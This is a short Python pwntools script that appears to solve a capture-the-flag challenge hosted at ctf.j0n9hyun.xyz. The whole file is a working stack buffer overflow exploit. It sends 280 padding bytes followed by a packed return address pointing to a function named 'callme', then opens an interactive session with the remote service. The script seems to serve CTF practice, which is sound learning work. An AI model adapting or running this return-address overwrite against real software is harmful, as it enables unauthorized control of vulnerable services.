from pwn import *
r=remote("ctf.j0n9hyun.xyz",3004)
payload = "a"*280
callme=0x0400606
payload +=p64(callme)

r.send(payload)
r.interactive()

